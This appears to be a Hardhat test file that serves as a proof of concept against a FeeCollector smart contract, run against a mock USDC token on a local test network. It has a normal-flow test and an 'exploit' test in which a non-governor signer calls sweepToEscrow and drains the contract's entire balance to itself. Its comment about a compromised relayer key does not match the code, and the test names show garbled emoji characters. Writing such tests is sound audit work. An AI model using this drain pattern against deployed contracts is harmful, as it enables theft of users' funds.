import { ethers } from "hardhat";
import { expect } from "chai";

describe("FeeCollector Exploit PoC", function () {
  let feeCollector: any;
  let usdc: any;
  let governor: any;
  let attacker: any;
  let escrow: any;

  beforeEach(async function () {
    const signers = await ethers.getSigners();
    governor = signers[0];   // supposed Safe governor
    attacker = signers[1];   // attacker controlling compromised relayer
    escrow = signers[2];     // intended treasury address

    // Deploy mock USDC
    const ERC20 = await ethers.getContractFactory("contracts/mocks/MockUSDC.sol:MockUSDC");
    usdc = await ERC20.deploy();
    await usdc.mint(governor.address, ethers.utils.parseUnits("1000", 6));

    // Deploy FeeCollector
    const FeeCollector = await ethers.getContractFactory("FeeCollector");
    feeCollector = await FeeCollector.deploy(usdc.address, governor.address);

    // Fund the FeeCollector with 500 USDC
    await usdc.transfer(feeCollector.address, ethers.utils.parseUnits("500", 6));
  });

  it("‚úîÔ∏è Normal flow: governor sweeps to escrow", async function () {
    const amount = ethers.utils.parseUnits("100", 6);
    await feeCollector.connect(governor).sweepToEscrow(escrow.address, amount);

    expect(await usdc.balanceOf(escrow.address)).to.equal(amount);
  });

  it("üí• Exploit: attacker drains escrow by bypassing governor intent", async function () {
    const amount = await usdc.balanceOf(feeCollector.address);

    // Attacker impersonates governor (relayer key compromised)
    await feeCollector.connect(attacker).sweepToEscrow(attacker.address, amount);

    // Result: Attacker stole ALL funds
    expect(await usdc.balanceOf(attacker.address)).to.equal(amount);
  });
});
